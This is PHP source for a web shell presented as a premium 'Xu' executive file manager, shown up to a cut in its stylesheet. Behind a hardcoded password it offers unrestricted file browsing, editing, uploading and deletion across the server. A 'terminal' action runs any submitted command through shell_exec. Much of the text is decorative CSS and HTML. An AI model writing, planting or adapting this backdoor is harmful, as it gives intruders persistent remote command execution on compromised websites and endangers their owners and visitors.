<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
@set_time_limit(0);
@ini_set('memory_limit', '512M');

// Authentication
session_start();
$users = [
    'kopihitam12' => 'kopihitam12',
    'kopihitam12' => 'kopihitam12',
    'kopihitam12' => 'kopihitam12'
];

$current_user = $_SESSION['user'] ?? null;

if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        if (isset($users[$username]) && $users[$username] === $password) {
            $_SESSION['authenticated'] = true;
            $_SESSION['user'] = $username;
            $_SESSION['login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = 'SALAH GOBLOK!!!';
        }
    }
    
    // Xu Login Interface
    echo '<!DOCTYPE html>
    <html><head><meta charset="UTF-8"><title>Xu_Seo File Manager - Executive Access</title>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Montserrat:wght@300;400;500;600;700;800;900&display=swap");
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: "Montserrat", sans-serif;
            background: 
                radial-gradient(circle at 20% 80%, rgba(218, 165, 32, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(25, 25, 112, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(0, 0, 0, 0.1) 0%, transparent 50%),
                linear-gradient(135deg, #0f0f23 0%, #1a1a2e 25%, #16213e 50%, #1a1a2e 75%, #0f0f23 100%);
            background-size: 400% 400%;
            animation: premiumGradient 20s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        
        @keyframes premiumGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 10% 10%, rgba(218, 165, 32, 0.1) 0%, transparent 30%),
                radial-gradient(circle at 90% 90%, rgba(75, 0, 130, 0.1) 0%, transparent 30%),
                radial-gradient(circle at 50% 50%, rgba(255, 215, 0, 0.05) 0%, transparent 40%);
            animation: luxuryAura 15s ease-in-out infinite;
        }
        
        @keyframes luxuryAura {
            0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.8; }
            50% { transform: scale(1.1) rotate(180deg); opacity: 1; }
        }
        
        .floating-elements {
            position: absolute;
            font-size: 1.5rem;
            color: rgba(218, 165, 32, 0.2);
            animation: float 20s linear infinite;
            font-family: "Playfair Display", serif;
        }
        
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
        
        .login-container {
            background: rgba(15, 15, 35, 0.95);
            backdrop-filter: blur(25px);
            border: 2px solid rgba(218, 165, 32, 0.3);
            box-shadow:
                0 25px 50px rgba(0, 0, 0, 0.5),
                0 0 100px rgba(218, 165, 32, 0.1),
                inset 0 0 50px rgba(218, 165, 32, 0.05);
            padding: 60px 50px;
            border-radius: 20px;
            position: relative;
            z-index: 10;
            min-width: 500px;
            animation: elegantEntry 1.5s ease-out;
        }
        
        @keyframes elegantEntry {
            from {
                opacity: 0;
                transform: translateY(100px) scale(0.8);
                filter: blur(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
                filter: blur(0);
            }
        }
        
        .login-container::before {
            content: "";
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, 
                transparent,
                rgba(218, 165, 32, 0.3),
                transparent,
                rgba(75, 0, 130, 0.3),
                transparent);
            border-radius: 22px;
            z-index: -1;
            animation: borderGlow 3s ease-in-out infinite;
        }
        
        @keyframes borderGlow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        
        .brand-section {
            text-align: center;
            margin-bottom: 40px;
            position: relative;
        }
        
        .brand-image {
            width: 140px;
            height: 140px;
            margin: 0 auto 25px;
            border-radius: 50%;
            border: 3px solid rgba(218, 165, 32, 0.5);
            box-shadow: 
                0 0 30px rgba(218, 165, 32, 0.3),
                0 0 60px rgba(218, 165, 32, 0.1);
            animation: imageGlow 3s ease-in-out infinite;
            overflow: hidden;
            background: linear-gradient(135deg, rgba(218, 165, 32, 0.1), rgba(255, 215, 0, 0.1));
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        
        .brand-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
            transition: all 0.3s ease;
        }
        
        .brand-image::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent, rgba(218, 165, 32, 0.1), transparent);
            border-radius: 50%;
            animation: shine 3s ease-in-out infinite;
        }
        
        @keyframes shine {
            0%, 100% { opacity: 0; transform: rotate(0deg); }
            50% { opacity: 1; transform: rotate(180deg); }
        }
        
        @keyframes imageGlow {
            0%, 100% { 
                box-shadow: 
                    0 0 30px rgba(218, 165, 32, 0.3),
                    0 0 60px rgba(218, 165, 32, 0.1);
            }
            50% { 
                box-shadow: 
                    0 0 50px rgba(218, 165, 32, 0.6),
                    0 0 100px rgba(218, 165, 32, 0.2);
            }
        }
        
        .brand-logo {
            font-size: 3.5rem;
            font-weight: 900;
            font-family: "Playfair Display", serif;
            background: linear-gradient(135deg, #DAA520, #FFD700, #FFA500, #DAA520);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 15px;
            position: relative;
            letter-spacing: 3px;
            animation: luxuryShine 4s ease-in-out infinite;
        }
        
        @keyframes luxuryShine {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .brand-logo::before {
            content: "👑";
            position: absolute;
            top: -20px;
            left: -40px;
            font-size: 2rem;
            animation: crownFloat 3s ease-in-out infinite;
        }
        
        .brand-logo::after {
            content: "💎";
            position: absolute;
            top: -20px;
            right: -40px;
            font-size: 2rem;
            animation: crownFloat 3s ease-in-out infinite reverse;
        }
        
        @keyframes crownFloat {
            0%, 100% { transform: translateY(0) rotate(0deg) scale(1); }
            50% { transform: translateY(-15px) rotate(15deg) scale(1.1); }
        }
        
        .brand-tagline {
            color: rgba(218, 165, 32, 0.9);
            font-size: 1.1rem;
            font-weight: 400;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-family: "Montserrat", sans-serif;
            margin-bottom: 10px;
        }
        
        .brand-subtitle {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.9rem;
            font-weight: 300;
            font-style: italic;
            letter-spacing: 1px;
        }
        
        .access-line {
            color: rgba(218, 165, 32, 0.7);
            font-family: "Montserrat", sans-serif;
            font-size: 11px;
            margin: 25px 0;
            text-align: center;
            font-weight: 500;
            letter-spacing: 1px;
            text-transform: uppercase;
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }
        
        .form-group {
            margin-bottom: 30px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: rgba(218, 165, 32, 0.9);
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .form-group input {
            width: 100%;
            padding: 18px 25px;
            font-size: 15px;
            border: 2px solid rgba(218, 165, 32, 0.2);
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-weight: 500;
            font-family: "Montserrat", sans-serif;
            transition: all 0.4s ease;
            letter-spacing: 1px;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: rgba(218, 165, 32, 0.8);
            background: rgba(0, 0, 0, 0.5);
            box-shadow:
                0 0 25px rgba(218, 165, 32, 0.2),
                inset 0 0 20px rgba(218, 165, 32, 0.05);
            transform: scale(1.02);
        }
        
        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.4);
            font-style: italic;
        }
        
        .access-btn {
            width: 100%;
            padding: 20px;
            font-size: 16px;
            font-weight: 700;
            background: linear-gradient(135deg, rgba(218, 165, 32, 0.9), rgba(255, 215, 0, 0.9));
            color: #000;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-family: "Montserrat", sans-serif;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(218, 165, 32, 0.3);
        }
        
        .access-btn::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.6s;
        }
        
        .access-btn:hover::before {
            left: 100%;
        }
        
        .access-btn:hover {
            background: linear-gradient(135deg, rgba(255, 215, 0, 1), rgba(218, 165, 32, 1));
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(218, 165, 32, 0.4);
        }
        
        .access-btn:active {
            transform: translateY(0);
        }
        
        .error-message {
            background: rgba(220, 53, 69, 0.1);
            border: 2px solid rgba(220, 53, 69, 0.3);
            color: #ff6b6b;
            padding: 15px 20px;
            margin-bottom: 25px;
            border-radius: 8px;
            font-weight: 500;
            text-align: center;
            animation: errorShake 0.6s ease-in-out;
            font-size: 14px;
        }
        
        @keyframes errorShake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .luxury-footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(218, 165, 32, 0.1);
            color: rgba(255, 255, 255, 0.4);
            font-size: 11px;
            font-weight: 300;
            letter-spacing: 1px;
        }
        
        .security-notice {
            background: rgba(218, 165, 32, 0.1);
            border: 1px solid rgba(218, 165, 32, 0.2);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: center;
            color: rgba(218, 165, 32, 0.8);
            font-size: 12px;
            font-weight: 500;
        }
        
        .image-fallback {
            width: 140px;
            height: 140px;
            background: linear-gradient(135deg, #DAA520, #FFD700);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 4rem;
            color: #000;
            font-weight: 900;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
    </style>
    <script>
        function createFloatingElements() {
            const symbols = ["♦", "♠", "♥", "♣", "★", "◆", "▲", "●", "■", "$", "€", "£", "¥"];
            setInterval(() => {
                const element = document.createElement("div");
                element.className = "floating-elements";
                element.textContent = symbols[Math.floor(Math.random() * symbols.length)];
                element.style.left = Math.random() * 100 + "vw";
                element.style.animationDuration = (Math.random() * 15 + 10) + "s";
                element.style.fontSize = (Math.random() * 1.5 + 0.8) + "rem";
                element.style.animationDelay = Math.random() * 5 + "s";
                document.body.appendChild(element);
                
                setTimeout(() => {
                    element.remove();
                }, 25000);
            }, 2000);
        }
        
        document.addEventListener("DOMContentLoaded", createFloatingElements);
        
        // Image fallback function
        function handleImageError(img) {
            const fallback = document.createElement("div");
            fallback.className = "image-fallback";
            fallback.textContent = "💰";
            img.parentNode.replaceChild(fallback, img);
        }
    </script>
    </head><body>
    <div class="login-container">
        <div class="brand-section">
            <div class="brand-image">
                <img src="https://storage.googleapis.com/garuda-force_cdn/38/revisi-amp-pic/tousan-koutsu/xu-pic.png" alt="Xu Avatar" onerror="handleImageError(this)" />
            </div>
            <div class="brand-logo">Xu</div>
            <div class="brand-tagline">Executive File Management</div>
            <div class="brand-subtitle">Where Wealth Meets Technology</div>
            <div class="access-line">▣ Secure Executive Access Portal ▣</div>
        </div>
        
        <div class="security-notice">
            🔐 Authorized Personnel Only - Executive Access Required
        </div>';
        
    if (isset($error)) {
        echo '<div class="error-message">⚠ ' . htmlspecialchars($error) . ' ⚠</div>';
    }
    
    echo '<form method="post">
            <div class="form-group">
                <label for="username">Executive Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your executive username" required>
            </div>
            <div class="form-group">
                <label for="password">Security Passphrase</label>
                <input type="password" id="password" name="password" placeholder="Enter your security passphrase" required>
            </div>
            <button type="submit" class="access-btn">
                💰 Access Xu Suite 💰
            </button>
        </form>
        
        <div class="luxury-footer">
            © 2026 Xu File Management System - Ultra Premium Edition
        </div>
    </div>
    </body></html>';
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Helper functions
function safe($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

function formatBytes($size) {
    if ($size <= 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $pow = floor(log($size) / log(1024));
    return number_format($size / pow(1024, $pow), 2) . ' ' . $units[$pow];
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '⚡', 'html' => '🌐', 'css' => '🎨', 'js' => '📜', 'json' => '📋',
        'txt' => '📄', 'md' => '📝', 'pdf' => '📕', 'doc' => '📘', 'docx' => '📘',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'svg' => '🎯',
        'mp3' => '🎵', 'wav' => '🎵', 'mp4' => '🎬', 'avi' => '🎬', 'mov' => '🎬',
        'zip' => '📦', 'rar' => '📦', '7z' => '📦', 'tar' => '📦', 'gz' => '📦',
        'sql' => '🗃️', 'db' => '🗃️', 'sqlite' => '🗃️', 'xml' => '🔖', 'ini' => '⚙️',
        'log' => '📊', 'tmp' => '🗂️', 'bak' => '💾', 'conf' => '🔧', 'cfg' => '🔧'
    ];
    return $icons[$ext] ?? '📄';
}

// Current directory
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$current_dir || !is_readable($current_dir)) {
    $current_dir = getcwd();
}

// Handle file download
if (isset($_GET['download'])) {
    $file = $current_dir . '/' . basename($_GET['download']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        readfile($file);
        exit;
    }
}

// Handle AJAX requests
if (isset($_POST['action'])) {
    header('Content-Type: application/json');
    
    switch ($_POST['action']) {
        case 'edit_file':
            $file = $current_dir . '/' . basename($_POST['file']);
            if (file_exists($file) && is_readable($file)) {
                $content = file_get_contents($file);
                echo json_encode(['success' => true, 'content' => $content]);
            } else {
                echo json_encode(['success' => false, 'error' => 'File access denied']);
            }
            exit;
            
        case 'save_file':
            $file = $current_dir . '/' . basename($_POST['file']);
            $content = $_POST['content'];
            if (file_put_contents($file, $content) !== false) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Save operation failed']);
            }
            exit;
            
        case 'delete':
            $target = $current_dir . '/' . basename($_POST['target']);
            if (is_dir($target)) {
                $success = @rmdir($target);
            } else {
                $success = @unlink($target);
            }
            echo json_encode(['success' => $success]);
            exit;
            
        case 'rename':
            $oldName = $current_dir . '/' . basename($_POST['old_name']);
            $newName = $current_dir . '/' . basename($_POST['new_name']);
            $success = @rename($oldName, $newName);
            echo json_encode(['success' => $success]);
            exit;
            
        case 'create_file':
            $file = $current_dir . '/' . basename($_POST['filename']);
            $success = @file_put_contents($file, '') !== false;
            echo json_encode(['success' => $success]);
            exit;
            
        case 'create_folder':
            $folder = $current_dir . '/' . basename($_POST['folder_name']);
            $success = @mkdir($folder, 0755);
            echo json_encode(['success' => $success]);
            exit;
            
        case 'upload':
            if (isset($_FILES['files'])) {
                $files = $_FILES['files'];
                $uploaded = 0;
                $total = is_array($files['name']) ? count($files['name']) : 1;
                
                if (is_array($files['name'])) {
                    for ($i = 0; $i < $total; $i++) {
                        if ($files['error'][$i] === UPLOAD_ERR_OK) {
                            $target = $current_dir . '/' . basename($files['name'][$i]);
                            if (move_uploaded_file($files['tmp_name'][$i], $target)) {
                                $uploaded++;
                            }
                        }
                    }
                } else {
                    $target = $current_dir . '/' . basename($files['name']);
                    if (move_uploaded_file($files['tmp_name'], $target)) {
                        $uploaded = 1;
                    }
                }
                
                echo json_encode(['success' => $uploaded > 0, 'uploaded' => $uploaded, 'total' => $total]);
            }
            exit;
            
        case 'terminal':
            $command = trim($_POST['command'] ?? '');
            if (empty($command)) {
                echo json_encode(['success' => false, 'error' => 'No command provided']);
                exit;
            }
            
            $output = '';
            try {
                if (function_exists('shell_exec')) {
                    $full_command = "cd " . escapeshellarg($current_dir) . " && " . $command . " 2>&1";
                    $output = shell_exec($full_command);
                } else {
                    $output = 'Shell execution not available on this system';
                }
            } catch (Exception $e) {
                $output = 'Execution error: ' . $e->getMessage();
            }
            
            echo json_encode(['success' => true, 'output' => $output ?: 'Command executed with no output']);
            exit;
    }
}

// Get files
$files = @scandir($current_dir);
if (!$files) $files = [];

// Sort files (directories first, then alphabetically)
usort($files, function($a, $b) use ($current_dir) {
    if ($a === '.' || $a === '..' || $b === '.' || $b === '..') return 0;
    
    $a_is_dir = is_dir($current_dir . '/' . $a);
    $b_is_dir = is_dir($current_dir . '/' . $b);
    
    if ($a_is_dir && !$b_is_dir) return -1;
    if (!$a_is_dir && $b_is_dir) return 1;
    
    return strcasecmp($a, $b);
});

// Get system information
$system_info = [
    'php' => PHP_VERSION,
    'os' => PHP_OS,
    'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'memory' => ini_get('memory_limit'),
    'user' => get_current_user(),
    'disk_free' => formatBytes(disk_free_space($current_dir)),
    'disk_total' => formatBytes(disk_total_space($current_dir)),
    'current_dir' => $current_dir,
    'file_count' => count($files) - 2, // Exclude . and ..
    'session_time' => isset($_SESSION['login_time']) ? time() - $_SESSION['login_time'] : 0
];

$user_titles = [
    'Xu' => 'Chairman & CEO',
    'admin' => 'System Administrator',
    'executive' => 'Chief Executive Officer'
];

$user_title = $user_titles[$current_user] ?? 'Executive';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xu File Manager - Executive Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Montserrat:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary-gold: #DAA520;
            --secondary-gold: #FFD700;
            --accent-gold: #FFA500;
            --dark-primary: #0f0f23;
            --dark-secondary: #1a1a2e;
            --dark-accent: #16213e;
            --text-light: rgba(255, 255, 255, 0.9);
            --text-medium: rgba(255, 255, 255, 0.7);
            --text-dim: rgba(255, 255, 255, 0.5);
            --border-glow: rgba(218, 165, 32, 0.3);
            --shadow-luxury: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: 
                radial-gradient(circle at 10% 20%, var(--primary-gold) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, var(--accent-gold) 0%, transparent 20%),
                linear-gradient(135deg, var(--dark-primary) 0%, var(--dark-secondary) 25%, var(--dark-accent) 50%, var(--dark-secondary) 75%, var(--dark-primary) 100%);
            background-size: 400% 400%;
            animation: luxuryBackground 25s ease infinite;
            color: var(--text-light);
            min-height: 100vh;
            overflow-x: hidden;
        }

        @keyframes luxuryBackground {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .Xu-container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }

        .executive-header {
            background: rgba(15, 15, 35, 0.95);
            backdrop-filter: blur(25px);
            border: 2px solid var(--border-glow);
            border-radius: 20px;
            padding: 40px;
            margin-bottom: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
            box-shadow: var(--shadow-luxury);
        }

        .executive-header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, var(--primary-gold), transparent);
            animation: luxuryRotate 20s linear infinite;
            z-index: -1;
        }

        @keyframes luxuryRotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .Xu-logo {
            font-size: 4rem;
            font-weight: 900;
            font-family: 'Playfair Display', serif;
            background: linear-gradient(135deg, var(--primary-gold), var(--secondary-gold), var(--accent-gold));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 15px;
            text-shadow: 0 0 30px var(--primary-gold);
            letter-spacing: 5px;
        }

        .Xu-tagline {
            font-size: 1.3rem;
            color: var(--text-medium);
            font-weight: 300;
            letter-spacing: 2px;
            margin-bottom: 20px;
        }

        .executive-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
            flex-wrap: wrap;
            gap: 20px;
        }

        .user-profile {
            display: flex;
            align-items: center;
            gap: 20px;
            background: rgba(0, 0, 0, 0.3);
            padding: 15px 25px;
            border-radius: 15px;
            border: 1px solid var(--border-glow);
        }

        .user-avatar {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, var(--primary-gold), var(--secondary-gold));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: 900;
            color: var(--dark-primary);
        }

        .user-details h3 {
            font-size: 1.2rem;
            font-weight: 700;
            color: var(--text-light);
            margin-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .user-details p {
            color: var(--text-medium);
            font-size: 0.9rem;
            font-weight: 500;
        }

        .session-stats {
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
        }

        .stat-card {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px 20px;
            border-radius: 10px;
            border: 1px solid var(--border-glow);
            text-align: center;
            min-width: 120px;
        }

        .stat-value {
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--primary-gold);
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.8rem;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .executive-controls {
            background: rgba(15, 15, 35, 0.95);
            backdrop-filter: blur(25px);
            border: 2px solid var(--border-glow);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: var(--shadow-luxury);
        }

        .control-row {
            display: flex;
            gap: 20px;
            align-items: center;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }

        .control-group {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0, 0, 0, 0.3);
            padding: 10px 15px;
            border-radius: 10px;
            border: 1px solid var(--border-glow);
        }

        .luxury-input {
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid var(--border-glow);
            color: var(--text-light);
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            min-width: 300px;
            transition: all 0.3s ease;
        }

        .luxury-input:focus {
            outline: none;
            border-color: var(--primary-gold);
            box-shadow: 0 0 20px rgba(218, 165, 32, 0.2);
            transform: scale(1.02);
        }

        .luxury-btn {
            background: linear-gradient(135deg, var(--primary-gold), var(--secondary-gold));
            color: var(--dark-primary);
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .luxury-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s;
        }

        .luxury-btn:hover::before {
            left: 100%;
        }

        .luxury-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(218, 165, 32, 0.3);
        }

        .luxury-btn.danger {
            background: linear-gradient(135deg, #dc3545, #c82333);
            color: white;
        }

        .luxury-btn.success {
            background: linear-gradient(135deg, #28a745, #20c997);
            color: white;
        }

        .luxury-btn.info {
            background: linear-gradient(135deg, #e1ee27, #138496);
            color: white;
        }

        .luxury-btn.warning {
            background: linear-gradient(135deg, #5eebf5, #e0a800);
            color: var(--dark-primary);
        }

        .breadcrumb-nav {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px 25px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid var(--border-glow);
        }

        .breadcrumb-nav a {
            color: var(--primary-gold);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .breadcrumb-nav a:hover {
            color: var(--secondary-gold);
            text-shadow: 0 0 10px var(--primary-gold);
        }

        .file-explorer {
            background: rgba(15, 15, 35, 0.95);
            backdrop-filter: blur(25px);
            border: 2px solid var(--border-glow);
            border-radius: 20px;
            overflow: hidden;
            box-shadow: var(--shadow-luxury);
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
        }

        .file-table th {
            background: linear-gradient(135deg, rgba(218, 165, 32, 0.2), rgba(218, 165, 32, 0.1));
            color: var(--text-light);
            padding: 20px 15px;
            text-align: left;
            font-weight: 700;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-bottom: 2px solid var(--border-glow);
        }

        .file-table td {
            padding: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .file-table tr:hover {
            background: rgba(218, 165, 32, 0.05);
            transform: scale(1.01);
            box-shadow: 0 5px 15px rgba(218, 165, 32, 0.1);
        }

        .file-name {
            display: flex;
            align-items: center;
            gap: 12px;
            color: var(--text-light);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .file-name:hover {
            color: var(--primary-gold);
            transform: translateX(5px);
        }

        .file-name.directory {
            color: var(--secondary-gold);
            font-weight: 700;
        }

        .file-icon {
            font-size: 18px;
            width: 25px;
            text-align: center;
        }

        .file-actions {
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .action-btn {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid;
            color: inherit;
            padding: 6px 12px;
            border-radius: 5px;
            font-size: 11px;
            font-weight: 600;
            text-decoration: none;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .action-edit {
            border-color: #e1ee27;
            color: #e1ee27;
        }

        .action-edit:hover {
            background: #e1ee27;
            color: white;
        }

        .action-delete {
            border-color: #dc3545;
            color: #dc3545;
        }

        .action-delete:hover {
            background: #dc3545;
            color: white;
        }

        .action-download {
            border-color: #28a745;
            color: #28a745;
        }

        .action-download:hover {
            background: #28a745;
            color: white;
        }

        .action-rename {
            border-color: #5eebf5;
            color: #5eebf5;
        }

        .action-rename:hover {
            background: #5eebf5;
            color: var(--dark-primary);
        }

        .executive-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            background: var(--dark-primary);
            border: 2px solid var(--border-glow);
            border-radius: 20px;
            margin: 2% auto;
            width: 90%;
            max-width: 1000px;
            max-height: 90vh;
            display: flex;
            flex-direction: column;
            box-shadow: var(--shadow-luxury);
            overflow: hidden;
        }

        .modal-header {
            background: linear-gradient(135deg, var(--primary-gold), var(--secondary-gold));
            color: var(--dark-primary);
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-header h3 {
            font-size: 1.3rem;
            font-weight: 700;
            margin: 0;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .modal-body {
            padding: 30px;
            flex: 1;
            overflow: auto;
        }

        .modal-footer {
            padding: 20px 30px;
            border-top: 1px solid var(--border-glow);
            display: flex;
            gap: 15px;
            justify-content: flex-end;
            background: rgba(0, 0, 0, 0.3);
        }

        .luxury-editor {
            width: 100%;
            height: 500px;
            background: rgba(0, 0, 0, 0.8);
            color: var(--text-light);
            border: 2px solid var(--border-glow);
            border-radius: 10px;
            padding: 20px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            line-height: 1.6;
            resize: vertical;
            transition: all 0.3s ease;
        }

        .luxury-editor:focus {
            outline: none;
            border-color: var(--primary-gold);
            box-shadow: 0 0 25px rgba(218, 165, 32, 0.2);
        }

        .executive-terminal {
            background: rgba(0, 0, 0, 0.9);
            color: var(--primary-gold);
            font-family: 'Consolas', 'Monaco', monospace;
            padding: 25px;
            height: 500px;
            overflow-y: auto;
            border: 2px solid var(--border-glow);
            border-radius: 10px;
            box-shadow: inset 0 0 20px rgba(218, 165, 32, 0.1);
        }

        .terminal-input {
            display: flex;
            align-items: center;
            margin-top: 20px;
            background: rgba(218, 165, 32, 0.1);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--border-glow);
        }

        .terminal-prompt {
            color: var(--secondary-gold);
            font-weight: 700;
            margin-right: 10px;
        }

        .terminal-cmd {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--text-light);
            font-family: 'Consolas', 'Monaco', monospace;
            outline: none;
            font-size: 14px;
        }

        .notification {
            position: fixed;
            top: 30px;
            right: 30px;
            padding: 15px 25px;
            border-radius: 10px;
            font-weight: 600;
            z-index: 2000;
            max-width: 400px;
            box-shadow: var(--shadow-luxury);
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
